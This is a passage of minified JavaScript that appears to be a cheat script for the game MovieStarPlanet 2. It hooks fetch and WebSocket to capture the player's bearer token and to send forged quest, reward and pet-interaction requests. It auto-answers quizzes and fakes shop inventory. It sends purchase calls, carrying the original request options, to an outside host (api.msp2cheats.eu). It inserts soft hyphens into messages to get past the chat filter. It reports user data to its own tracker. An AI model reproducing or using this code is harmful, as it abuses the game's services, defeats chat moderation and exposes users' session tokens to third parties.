                    profileId: e,
                    name: i
                } = t(n.split(".")[1]);
                return {
                    profileId: e,
                    name: i
                }
            } catch {
                return e
            }
        }
    })()), n(i, "getToken", (() => s.t.getItem(r))), n(i, "saveToken", (t => t && s.t.setItem(r, t))), n(i, "isValidToken", (t => !!(t?.length >>> 0)));
    var l = new WeakMap,
        p = new WeakMap,
        w = new WeakMap;
    class f {
        constructor() {
            h(this, l, !1), h(this, p, {
                s: "https://umami.msp2.lol/script.js",
                i: "511ee3e4-ed45-4e55-9931-986040b1b070"
            }), h(this, w, (() => {
                if (d(l, this)) return;
                const t = document.createElement("script");
                Object.assign(t, {
                    src: d(p, this).s,
                    defer: !0,
                    onload: () => function (t, e, n) {
                        return t.set(u(t, e), n), n
                    }(l, this, !0)
                }), t.setAttribute("data-website-id", d(p, this).i), document.head.appendChild(t)
            })), c(this, "track", ((t, e) => window.umami?.track(t, e))), d(w, this).call(this)
        }
    }
    o = f;
    var m, g = {
        t: void 0
    };

    function b(t, e, n) {
        return (e = function (t) {
            var e = function (t) {
                if ("object" != typeof t || !t) return t;
                var e = t[Symbol.toPrimitive];
                if (void 0 !== e) {
                    var n = e.call(t, "string");
                    if ("object" != typeof n) return n;
                    throw new TypeError("@@toPrimitive must return a primitive value.")
                }
                return String(t)
            }(t);
            return "symbol" == typeof e ? e : e + ""
        }(e)) in t ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : t[e] = n, t
    }

    function v(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function y(t, e) {
        return t.get(function (t, e, n) {
            if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
            throw new TypeError("Private element is not present on this object")
        }(t, e))
    }
    c(f, "getInstance", (() => g.t ?? (g.t = new o)));
    var x = new WeakMap,
        k = new WeakMap,
        S = new WeakMap,
        M = new WeakMap,
        W = new WeakMap,
        j = new WeakMap;
    class T {
        constructor() {
            if (v(this, x, new Set(["google-analytics.com", "region1.analytics.google.com", "analytics.eu.moviestarplanet.app", "www.google-analytics.com"])), v(this, k, new Map), v(this, S, new Map), v(this, M, {
                    h: {
                        "content-type": "application/json",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                        accept: "application/json, text/plain, */*",
                        "accept-language": "en-US,en;q=0.9",
                        origin: "https://www.moviestarplanet.com",
                        referer: "https://www.moviestarplanet.com/",
                        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                        "sec-ch-ua-mobile": "?0",
                        "sec-ch-ua-platform": '"Windows"',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "cross-site"
                    }
                }), v(this, W, (() => {
                    const t = XMLHttpRequest.prototype,
                        e = window.fetch;
                    var n;
                    t.open = (n = t.open, function () {
                        for (var t = arguments.length, e = new Array(t), i = 0; i < t; i++) e[i] = arguments[i];
                        return y(j, this).call(this, e[1]) ? void this.abort() : n.apply(this, e)
                    }), Object.defineProperty(window, "fetch", {
                        value: function (t, n) {
                            return y(j, this).call(this, t) ? Promise.resolve(new Response(null, {
                                status: 403
                            })) : e.call(window, t, n)
                        }.bind(this),
                        writable: !0
                    })
                })), v(this, j, (t => {
                    if (y(k, this).has(t)) return y(k, this).get(t);
                    try {
                        const e = y(x, this).has(new URL(t).hostname);
                        return y(k, this).set(t, e), e
                    } catch {
                        return !1
                    }
                })), b(this, "getHeaders", (t => {
                    const e = t || "";
                    if (y(S, this).has(e)) return y(S, this).get(e);
                    const n = {
                        ...y(M, this).h,
                        authorization: t ? `Bearer ${t}` : ""
                    };
                    return Object.freeze(n), y(S, this).set(e, n), n
                })), b(this, "delay", (function () {
                    let t = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 500,
                        e = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1500;
                    return new Promise((n => setTimeout(n, ~~(Math.random() * (e - t + 1)) + t)))
                })), z.t) return z.t;
            z.t = this, y(W, this).call(this)
        }
    }
    m = T;
    var z = {
        t: void 0
    };

    function E(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function O(t, e) {
        return t.get(P(t, e))
    }

    function C(t, e, n) {
        return t.set(P(t, e), n), n
    }

    function P(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    b(T, "getInstance", (() => z.t ?? new m));
    var $ = new WeakMap,
        I = new WeakMap,
        _ = new WeakMap,
        A = new WeakMap;
    class N {
        constructor() {
            E(this, $, !0), E(this, I, void 0), E(this, _, void 0), E(this, A, ["cf0589ffe9ed45369d70dcaaa9aa1db2", "6ca07ffa53e3468598e6f2a2e0d20ded", "cf42a511688e49f795e387d43a78c758", "d92645e7672142028f2731aeda6e8e6f", "39e585c334834622ab69fa636068d278", "7e4f2d790d5c4b3e808f3737b30f6458", "c568275ccfbb482486d54942542fe22f", "e79da67391154e56ad381960ca344b54", "3924865e60fe426eb2862fd9a7a813b5", "d2d9a0623b24dde83142b8951ea3a79", "8a05904fe4c042009f60ea0e3958832e"]), C(I, this, f.getInstance()), C(_, this, T.getInstance()), this.initialize()
        }
        initialize() {
            this.interceptFetchRequests(), this.interceptWebSocket()
        }
        interceptFetchRequests() {
            var t = this;
            const e = window.fetch;
            window.fetch = async function () {
                for (var n = arguments.length, o = new Array(n), r = 0; r < n; r++) o[r] = arguments[r];
                const [s, a] = o;
                try {
                    if (a?.headers) {
                        const e = Object.entries(a.headers).find((t => {
                            let [e] = t;
                            return "authorization" === e.toLowerCase()
                        }))?. [1];
                        if (e && e.startsWith("Bearer ")) {
                            const n = t.extractBearerToken(e);
                            i.isValidToken(n) && i.saveToken(n)
                        }
                    }
                    if (s.includes("games/j68d/definitions?questType=EventQuest&questType=StaticDailyQuest&questType=RandomDailyQuest")) {
                        O(I, t).track("All Quests Completed");
                        const n = await e.apply(window, o),
                            i = await n.clone().json();
                        return i.questDefinitions && await t.processQuestDefinitions(i.questDefinitions), n
                    }
                    if (s.includes("games/j68d/quests?questType=EventQuest&questType=StaticDailyQuest&questType=RandomDailyQuest")) {
                        O(I, t).track("All Quests Completed");
                        const n = await e.apply(window, o),
                            i = await n.clone().json();
                        return i.questDefinitions && await t.processQuestDefinitions(i.quests), n
                    }
                } catch (t) {}
                return e.apply(window, o)
            }
        }
        extractBearerToken(t) {
            return t.replace("Bearer ", "").trim()
        }
        getToken() {
            return i.getToken() || null
        }
        async resetAvatar() {
            try {
                const t = this.getToken(),
                    e = this.getProfileId();
                if (!t || !e) throw new Error("Missing authentication");
                const n = await fetch(`https://eu.mspapis.com/profileattributes/v1/profiles/${e}/games/j68d/attributes`, {
                        headers: O(_, this).getHeaders(t)
                    }),
                    i = await n.json();
                if (!i?.avatarId) throw new Error("No avatar ID found");
                const o = await fetch("https://api.allorigins.win/raw?url=" + encodeURIComponent("https://github.com/mwarcc/msp2guis/raw/refs/heads/main/default.bson"));
                if (!o.ok) throw new Error("Failed to get default avatar");
                const r = await o.arrayBuffer(),
                    s = await fetch(`https://eu.mspapis.com/profilegeneratedcontent/v2/profiles/${e}/games/j68d/avatars/${i.avatarId}`, {
                        method: "PUT",
                        headers: {
                            ...O(_, this).getHeaders(t),
                            "content-type": "application/bson",
                            signature: "2eA/CteuR/k2YUipj3YflkjpxJLRoUlSbNNY8xpwo6S8="
                        },
                        body: r
                    });
                if (!s.ok) throw new Error(`Avatar update failed: ${s.status}`)
            } catch (t) {}
        }
        async processQuestDefinitions(t) {
            const e = this.getToken(),
                n = this.getProfileId();
            if (!e || !n) return;
            const i = async t => {
                const o = t.definitionId;
                if (!o) return;
                const r = async () => {
                    try {
                        await fetch(`https://eu.mspapis.com/quests/v2/profiles/${n}/games/j68d/quests/${o}/progress`, {
                            method: "PUT",
                            headers: O(_, this).getHeaders(e),
                            body: JSON.stringify({
                                progress: 1
                            })
                        })
                    } catch (t) {}
                }, s = o.toLowerCase().includes("gift") ? 4 : 1;
                for (let t = 0; t < s; t++) await r();
                if (t.children && Array.isArray(t.children))
                    for (const e of t.children) await i(e)
            };
            for (const e of t) await i(e);
            await this.updateSpecificQuests(n, e), await this.processPetInteractions(n, e)
        }
        async updateSpecificQuests(t, e) {
            try {
                await fetch(`https://eu.mspapis.com/quests/v2/profiles/${t}/games/j68d/quests/random_daily_change_profile_bg/state`, {
                    method: "PUT",
                    headers: O(_, this).getHeaders(e),
                    body: JSON.stringify({
                        state: "Complete"
                    })
                });
                for (let n = 0; n < 10; n++) await fetch(`https://eu.mspapis.com/quests/v2/profiles/${t}/games/j68d/quests/daily_pet_pets/state`, {
                    method: "PUT",
                    headers: O(_, this).getHeaders(e),
                    body: JSON.stringify({
                        state: "Complete"
                    })
                });
                for (let n = 0; n < 4; n++) await fetch(`https://eu.mspapis.com/timelimitedrewards/v2/profiles/${t}/games/j68d/rewards/daily_pickup`, {
                    method: "PUT",
                    headers: O(_, this).getHeaders(e),
                    body: JSON.stringify({
                        state: "Claimed"
                    })
                })
            } catch (t) {}
        }
        async processPetInteractions(t, e) {
            for (const n of O(A, this)) try {
                await fetch(`https://eu.mspapis.com/pets/v1/pets/${n}/interactions`, {
                    method: "POST",
                    headers: O(_, this).getHeaders(e),
                    body: JSON.stringify({
                        profileId: t,
                        gameId: "j68d"
                    })
                })
            } catch (t) {}
        }
        getProfileId() {
            const t = this.getToken();
            if (!t) return null;
            try {
                return JSON.parse(atob(t.split(".")[1])).profileId
            } catch (t) {
                return null
            }
        }
        interceptWebSocket() {
            const t = window.WebSocket,
                e = this;
            window.WebSocket = function () {
                for (var n = arguments.length, i = new Array(n), o = 0; o < n; o++) i[o] = arguments[o];
                const r = new t(...i);
                r.addEventListener("message", (t => {
                    O($, e) && e.handleQuizMessage(r, t.data)
                }));
                const s = r.send;
                return r.send = function (t) {
                    return O($, e) && "string" == typeof t && e.handleOutgoingMessage(t, r), s.apply(this, arguments)
                }, r
            }, Object.assign(window.WebSocket, t)
        }
        handleOutgoingMessage(t, e) {
            '42["chatv2:send",{"message":"avreset"}]' !== t && '42["chatv2:send",{"message":"a­v­r­e­s­e­t"}]' !== t || (O(I, this).track("Avatar Reset"), this.resetAvatar())
        }
        toggle() {
            C($, this, !O($, this))
        }
    }

    function J(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function q(t, e) {
        return t.get(U(t, e))
    }

    function D(t, e, n) {
        return t.set(U(t, e), n), n
    }

    function U(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var L = new WeakMap,
        R = new WeakMap,
        G = new WeakMap,
        Q = new WeakMap;
    class B {
        constructor() {
            J(this, L, !0), J(this, R, new Map), J(this, G, null), J(this, Q, void 0), D(Q, this, f.getInstance()), this.initialize()
        }
        async initialize() {
            try {
                const t = await fetch("https://raw.githubusercontent.com/mwarcc/ss/refs/heads/main/quiz.json");
                if (!t.ok) throw new Error(`HTTP error! Status: ${t.status}`);
                const e = await t.json();
                Object.entries(e).forEach((t => {
                    let [e, n] = t;
                    q(R, this).set(e, n)
                })), this.interceptWebSocket()
            } catch (t) {}
        }
        interceptWebSocket() {
            const t = window.WebSocket,
                e = this;
            window.WebSocket = function () {
                for (var n = arguments.length, i = new Array(n), o = 0; o < n; o++) i[o] = arguments[o];
                const r = new t(...i);
                return r.addEventListener("message", (t => {
                    q(L, e) && e.handleMessage(r, t.data)
                })), r
            }, Object.assign(window.WebSocket, t)
        }
        handleMessage(t, e) {
            if (e.startsWith('40{"jwt":"') || e.match(/^\d+$/)) return;
            const n = e.startsWith("42[") ? e.substring(2) : e;
            try {
                const [e, i] = JSON.parse(n);
                this.processPayload(t, i)
            } catch (t) {}
        }
        processPayload(t, e) {
            const {
                messageType: n,
                messageContent: i
            } = e;
            switch (n) {
            case "game:state":
                q(Q, this).track("Quiz State"), this.handleGameState(t, i);
                break;
            case "quiz:chal":
                q(Q, this).track("Quiz Challenge"), this.handleQuizChallenge(i);
                break;
            case "quiz:reveal":
                q(Q, this).track("Quiz Reveal"), this.handleQuizReveal(i)
            }
        }
        handleGameState(t, e) {
            if ("waiting_for_answer" === e.newState) {
                q(Q, this).track("Waiting For Quiz Answer");
                const e = q(G, this) && q(R, this).get(q(G, this))?.correctAnswer ? q(R, this).get(q(G, this)).correctAnswer : Math.floor(3 * Math.random()) + 1;
                t.send(`42${JSON.stringify(["quiz:answer",{answer:e}])}`)
            }
        }
        handleQuizChallenge(t) {
            let {
                question: e,
                answers: n
            } = t;
            e && n && (D(G, this, e), q(R, this).has(e) || q(R, this).set(e, {
                answers: n,
                correctAnswer: null
            }))
        }
        handleQuizReveal(t) {
            let {
                correctAnswer: e
            } = t;
            if (q(G, this)) {
                const t = q(R, this).get(q(G, this));
                t && q(R, this).set(q(G, this), {
                    ...t,
                    correctAnswer: e
                })
            }
        }
        toggle() {
            D(L, this, !q(L, this)), q(Q, this).track("Auto Quiz Toggle")
        }
    }

    function Y(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function F(t, e) {
        return t.get(X(t, e))
    }

    function K(t, e, n) {
        return t.set(X(t, e), n), n
    }

    function X(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var H = new WeakMap,
        V = new WeakMap,
        Z = new WeakMap,
        tt = new WeakMap,
        et = new WeakMap,
        nt = new WeakMap,
        it = new WeakMap,
        ot = new WeakMap,
        rt = new WeakMap;
    class st {
        constructor() {
            var t = this;
            Y(this, H, !1), Y(this, V, void 0), Y(this, Z, /curatedcontentitemtemplates\/v2\/item-templates\//), Y(this, tt, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"), Y(this, et, (() => {
                const e = window.fetch;
                window.fetch = async function () {
                    for (var n = arguments.length, i = new Array(n), o = 0; o < n; o++) i[o] = arguments[o];
                    const r = i[0];
                    return F(H, t) && F(Z, t).test(r) ? (F(V, t).track("ItemLayeringService Called"), F(nt, t).call(t, e, ...i)) : e.apply(window, i)
                }
            })), Y(this, nt, (async function (e) {
                for (var n = arguments.length, i = new Array(n > 1 ? n - 1 : 0), o = 1; o < n; o++) i[o - 1] = arguments[o];
                try {
                    const n = await e.apply(window, i),
                        o = await n.clone().json();
                    return F(it, t).call(t, o), new Response(JSON.stringify(o), {
                        status: 200,
                        statusText: "OK",
                        headers: {
                            "Content-Type": "application/json"
                        }
                    })
                } catch (t) {
                    return e.apply(window, i)
                }
            })), Y(this, it, (t => {
                t.forEach((t => {
                    t.tags?.forEach((t => {
                        t.resourceIdentifiers?.forEach((t => t.key = F(ot, this).call(this)))
                    })), t.additionalData?.MSP2Data && (t.additionalData.MSP2Data.Type = F(ot, this).call(this))
                }))
            })), Y(this, ot, (function () {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 10;
                return Array.from({
                    length: e
                }, (() => F(tt, t)[~~(Math.random() * F(tt, t).length)])).join("")
            })), Y(this, rt, (() => {
                window.addEventListener("keydown", (t => {
                    t.shiftKey && /^[aA]$/.test(t.key) && (K(H, this, !F(H, this)), F(V, this).track("ItemLayeringService " + (F(H, this) ? "enabled" : "disabled")))
                }))
            })), K(V, this, f.getInstance()), F(et, this).call(this), F(rt, this).call(this)
        }
    }

    function at(t, e, n) {
        return (e = function (t) {
            var e = function (t) {
                if ("object" != typeof t || !t) return t;
                var e = t[Symbol.toPrimitive];
                if (void 0 !== e) {
                    var n = e.call(t, "string");
                    if ("object" != typeof n) return n;
                    throw new TypeError("@@toPrimitive must return a primitive value.")
                }
                return String(t)
            }(t);
            return "symbol" == typeof e ? e : e + ""
        }(e)) in t ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : t[e] = n, t
    }

    function ct(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function ht(t, e, n) {
        return t.set(ut(t, e), n), n
    }

    function dt(t, e) {
        return t.get(ut(t, e))
    }

    function ut(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var lt = new WeakMap,
        pt = new WeakMap,
        wt = new WeakMap,
        ft = new WeakMap,
        mt = new WeakMap,
        gt = new WeakMap,
        bt = new WeakMap,
        vt = new WeakMap,
        yt = new WeakMap,
        xt = new WeakMap,
        kt = new WeakMap;
    class St {
        constructor() {
            var t = this;
            ct(this, lt, !0), ct(this, pt, {
                d: !1
            }), ct(this, wt, f.getInstance()), ct(this, ft, window.fetch), ct(this, mt, {
                b: "https://api.msp2cheats.eu/purchase",
                x: "https://api.xerus.lol/listings"
            }), ct(this, gt, (() => dt(xt, this).call(this))), ct(this, bt, (t => {
                if (!dt(lt, this) || "string" != typeof t) return !1;
                if (t.includes("/profileinventory/v1/profiles/") && t.includes("/games/j68d/inventory/items")) return !0;
                if (t === dt(mt, this).b) return !0;
                const e = /(?:eu|us)\.mspapis\.com\/shop(?:inventory|purchase)\/v1\/(?:shops|games\/j68d\/profiles)/.test(t),
                    n = /\/(shops\/(?:6|13)\/tags)/.test(t);
                return e && !n
            })), ct(this, vt, (() => "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (function (t) {
                const e = 16 * Math.random() | 0;
                return ("x" === t ? e : 3 & e | 8).toString(16)
            })))), ct(this, yt, (t => {
                if (!dt(lt, this)) return t;
                try {
                    const e = new URL(t);
                    if (e.pathname.includes("/items/purchase") || e.pathname.includes("/shop/purchase")) return dt(mt, this).b;
                    if (dt(pt, this).d && e.pathname.includes("/shopinventory")) {
                        const t = new URLSearchParams(e.search),
                            n = new URL(dt(mt, this).x);
                        return [...t].filter((t => {
                            let [e] = t;
                            return !/auth/i.test(e)
                        })).forEach((t => {
                            let [e, i] = t;
                            return n.searchParams.append(e, i)
                        })), n.searchParams.append("diamondPack", "True"), n.toString()
                    }
                    return t
                } catch {
                    return t
                }
            })), ct(this, xt, (() => {
                window.fetch = async function () {
                    for (var e = arguments.length, n = new Array(e), i = 0; i < e; i++) n[i] = arguments[i];
                    const [o, r] = n;
                    if (!dt(bt, t).call(t, o)) return dt(ft, t).apply(window, n);
                    if (o.includes("/profileinventory/v1/profiles/") && o.includes("/games/j68d/inventory/items")) try {
                        const e = await dt(ft, t).apply(window, n),
                            i = await e.clone().json(),
                            o = JSON.parse(localStorage.getItem("purchaseList") || "[]");
                        return o.length > 0 ? (o.forEach((e => {
                            i.push({
                                id: dt(vt, t).call(t),
                                objectId: e.id,
                                itemId: e.id,
                                objectSource: "curatedcontentitemtemplates",
                                itemSource: "curatedcontentitemtemplates",
                                metadata: {
                                    added: (new Date).toISOString()
                                },
                                additionalData: e.additionalData || {},
                                tags: [{
                                    id: "59",
                                    source: "curatedcontentitemtemplates"
                                }, {
                                    id: "60",
                                    source: "curatedcontentitemtemplates"
                                }, {
                                    id: "144",
                                    source: "curatedcontentitemtemplates"
                                }, {
                                    id: "154",
                                    source: "curatedcontentitemtemplates"
                                }]
                            })
                        })), new Response(JSON.stringify(i), {
                            status: 200,
                            statusText: "OK",
                            headers: {
                                "Content-Type": "application/json"
                            }
                        })) : e
                    } catch (e) {
                        return dt(ft, t).apply(window, n)
                    }
                    const s = dt(yt, t).call(t, o);
                    return s === dt(mt, t).b ? dt(kt, t).call(t, s, r ?? {}) : dt(ft, t).call(t, s, r ?? {})
                }
            })), ct(this, kt, (async (t, e) => {
                if (!dt(lt, this)) return dt(ft, this).call(this, t, e);
                try {
                    const n = await dt(ft, this).call(this, t, e),
                        o = await n.json(),
                        r = "purchaseList",
                        s = JSON.parse(localStorage.getItem(r) || "[]");
                    s.push(...o), localStorage.setItem(r, JSON.stringify(s.slice(-100)));
                    const a = i.getUserData(window.msp2Client?.getToken());
                    return a && dt(wt, this).track("Bought items from shop", a), new Response(JSON.stringify(o), {
                        status: 200,
                        statusText: "OK",
                        headers: {
                            "Content-Type": "application/json"
                        }
                    })
                } catch (n) {
                    return dt(ft, this).call(this, t, e)
                }
            })), at(this, "setDisabled", (t => {
                let {
                    diamondPacks: e
                } = t;
                ht(pt, this, {
                    d: e
                }), ht(lt, this, !0)
            })), at(this, "toggle", (() => {
                ht(lt, this, !dt(lt, this))
            })), at(this, "restore", (() => {
                ht(lt, this, !1), window.fetch = dt(ft, this)
            })), dt(gt, this).call(this)
        }
    }

    function Mt(t, e, n) {
        return (e = function (t) {
            var e = function (t) {
                if ("object" != typeof t || !t) return t;
                var e = t[Symbol.toPrimitive];
                if (void 0 !== e) {
                    var n = e.call(t, "string");
                    if ("object" != typeof n) return n;
                    throw new TypeError("@@toPrimitive must return a primitive value.")
                }
                return String(t)
            }(t);
            return "symbol" == typeof e ? e : e + ""
        }(e)) in t ? Object.defineProperty(t, e, {
            value: n,
            enumerable: !0,
            configurable: !0,
            writable: !0
        }) : t[e] = n, t
    }

    function Wt(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function jt(t, e) {
        return t.get(Et(t, e))
    }

    function Tt(t, e, n) {
        e || (e = []);
        var i = e.length++;
        return Object.defineProperty({}, "t", {
            set: function (o) {
                e[i] = o, t.apply(n, e)
            }
        })
    }

    function zt(t, e, n) {
        return t.set(Et(t, e), n), n
    }

    function Et(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var Ot = new WeakMap,
        Ct = new WeakMap,
        Pt = new WeakMap,
        $t = new WeakMap,
        It = new WeakMap,
        _t = new WeakMap,
        At = new WeakMap,
        Nt = new WeakMap;
    class Jt {
        constructor() {
            var t = this;
            Wt(this, Ot, !0), Wt(this, Ct, void 0), Wt(this, Pt, void 0), Wt(this, $t, void 0), Wt(this, It, "­"), Wt(this, _t, (() => {
                jt(At, this).call(this), jt(Nt, this).call(this)
            })), Wt(this, At, (() => {
                window.fetch = async (t, e) => {
                    if (!jt(Ot, this)) return jt(Pt, this).call(window, t, e);
                    if (t.includes("/history") && e?.body) {
                        const t = e.headers?. ["Content-Type"] ?? e.headers?.get?.("Content-Type");
                        if (t?.includes("application/json")) try {
                            const t = "string" == typeof e.body ? e.body : await (e.body.text?.()),
                                n = JSON.parse(t);
                            n.MessageBody && (jt(Ct, this).track("Bypassed chat filtering", i.getUserData(window.msp2Client.getToken())), n.MessageBody = n.MessageBody.split("").join(jt(It, this)), e.body = JSON.stringify(n))
                        } catch (t) {}
                    }
                    return jt(Pt, this).call(window, t, e)
                }
            })), Wt(this, Nt, (() => {
                window.WebSocket = function () {
                    for (var e = arguments.length, n = new Array(e), o = 0; o < e; o++) n[o] = arguments[o];
                    const r = new(jt($t, t))(...n),
                        s = r.send;
                    return r.send = e => {
                        if (!jt(Ot, t)) return s.call(r, e);
                        try {
                            if ("string" == typeof e && e.startsWith("42[")) {
                                const n = JSON.parse(e.slice(2));
                                Array.isArray(n) && "chatv2:send" === n[0] && n[1]?.message && (n[1].message = n[1].message.split("").join(jt(It, t)), e = "42" + JSON.stringify(n), jt(Ct, t).track("Bypassed chat filtering in chatroom", i.getUserData(window.msp2Client.getToken())))
                            }
                        } catch (t) {}
                        s.call(r, e)
                    }, r
                }, Object.assign(window.WebSocket, jt($t, this))
            })), Mt(this, "toggle", (() => {
                zt(Ot, this, !jt(Ot, this))
            })), Mt(this, "restore", (() => {
                zt(Ot, this, !1), window.fetch = jt(Pt, this), window.WebSocket = jt($t, this)
            })), zt(Ct, this, f.getInstance()), [Tt(zt, [Pt, this]).t, Tt(zt, [$t, this]).t] = [window.fetch, window.WebSocket], jt(_t, this).call(this)
        }
    }

    function qt(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function Dt(t, e) {
        return t.get(Lt(t, e))
    }

    function Ut(t, e, n) {
        return t.set(Lt(t, e), n), n
    }

    function Lt(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var Rt = new WeakMap,
        Gt = new WeakMap,
        Qt = new WeakMap,
        Bt = new WeakMap;
    class Yt {
        constructor() {
            if (qt(this, Rt, !0), qt(this, Gt, localStorage.getItem("selectedEmote") || "default"), qt(this, Qt, void 0), qt(this, Bt, new Set(["noshoes_skating", "swim_new", "bunny_hold", "2023_spidercrawl_lsz", "bad_2022_teenwalk_dg", "xmas_2022_frosty_dg", "xmas_2022_freezing_lsz", "2022_turkeywalk_lsz", "2022_easter_sackjump_dg", "cool_slide", "very_2022_froglike_lsz", "2023_bended_lz", "spicyaftershave", "iceskate_ballerina", "im_in_love", "dream_2024_onthemoon_lsz", "bigcity_2025_stomping_lsz", "badd_2025_skateboardanim_lsz", "bambislide", "mood"])), Ft.t) return Ft.t;
            Ft.t = this, Ut(Qt, this, window.WebSocket), this.initialize()
        }
        static getInstance() {
            return Ft.t ?? new Yt
        }
        initialize() {
            this.interceptWebSocket()
        }
        getEmotes() {
            return Array.from(Dt(Bt, this))
        }
        getCurrentEmote() {
            return Dt(Gt, this)
        }
        get isEnabled() {
            return Dt(Rt, this)
        }
        setCurrentEmote(t) {
            Dt(Bt, this).has(t) && (Ut(Gt, this, t), localStorage.setItem("selectedEmote", t))
        }
        formatEmoteName(t) {
            return t.split("_").map((t => t.charAt(0).toUpperCase() + t.slice(1))).join(" ")
        }
        interceptWebSocket() {
            const t = this;
            window.WebSocket = function () {
                for (var e = arguments.length, n = new Array(e), i = 0; i < e; i++) n[i] = arguments[i];
                const o = new(Dt(Qt, t))(...n),
                    r = o.send;
                return o.send = function (e) {
                    if (Dt(Rt, t) && "string" == typeof e && e.startsWith('42["7001"')) try {
                        const n = JSON.parse(e.slice(2));
                        Array.isArray(n) && n[1]?.mood && (n[1].mood = Dt(Gt, t), e = "42" + JSON.stringify(n))
                    } catch (t) {}
                    return r.call(this, e)
                }, o
            }, Object.assign(window.WebSocket, Dt(Qt, this))
        }
        toggle() {
            Ut(Rt, this, !Dt(Rt, this))
        }
        restore() {
            Ut(Rt, this, !1), window.WebSocket = Dt(Qt, this)
        }
    }
    var Ft = {
        t: void 0
    };

    function Kt(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function Xt(t, e) {
        return t.get(Vt(t, e))
    }

    function Ht(t, e, n) {
        return t.set(Vt(t, e), n), n
    }

    function Vt(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var Zt = new WeakMap,
        te = new WeakMap,
        ee = new WeakMap,
        ne = new WeakMap,
        ie = new WeakMap,
        oe = new WeakMap,
        re = new WeakMap;
    class se {
        constructor() {
            Kt(this, Zt, !0), Kt(this, te, void 0), Kt(this, ee, void 0), Kt(this, ne, void 0), Kt(this, ie, void 0), Kt(this, oe, null), Kt(this, re, null), Ht(te, this, f.getInstance()), Ht(ee, this, T.getInstance()), Ht(ne, this, window.WebSocket), Ht(ie, this, window.fetch), this.initialize()
        }
        initialize() {
            this.interceptWebSocket(), this.createNotificationStyles(), this.setupKeyboardShortcut()
        }
        setupKeyboardShortcut() {
            window.addEventListener("keydown", (t => {
                t.altKey && "1" === t.key && (t.preventDefault(), this.handleAutogreetCommand())
            }))
        }
        createNotificationStyles() {
            const t = document.createElement("style");
            t.textContent = "\n      .greet-notification {\n        position: fixed;\n        top: -100px;\n        left: 50%;\n        transform: translateX(-50%);\n        background: rgba(17, 17, 27, 0.95);\n        color: #fff;\n        padding: 12px 24px;\n        border-radius: 12px;\n        font-family: 'Inter', system-ui, -apple-system, sans-serif;\n        font-size: 14px;\n        z-index: 10000;\n        display: flex;\n        align-items: center;\n        gap: 8px;\n        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);\n        border: 1px solid rgba(255, 255, 255, 0.1);\n        transition: top 0.3s cubic-bezier(0.4, 0, 0.2, 1);\n      }\n      .greet-notification.show {\n        top: 20px;\n      }\n    ", document.head.appendChild(t)
        }
        showNotification(t) {
            let e = !(arguments.length > 1 && void 0 !== arguments[1]) || arguments[1];
            const n = document.createElement("div");
            n.className = "greet-notification", n.innerHTML = `${e?"✅":"❌"} ${t}`, document.body.appendChild(n), setTimeout((() => n.classList.add("show")), 100), setTimeout((() => {
                n.classList.remove("show"), setTimeout((() => n.remove()), 300)
            }), 3e3)
        }
        interceptWebSocket() {
            const t = window.WebSocket,
                e = this;
            window.WebSocket = function () {
                for (var n = arguments.length, i = new Array(n), o = 0; o < n; o++) i[o] = arguments[o];
                const r = new t(...i);
                r.addEventListener("message", (t => {
                    Xt(Zt, e) && e.handleMessage(r, t.data)
                }));
                const s = r.send;
                return r.send = function (t) {
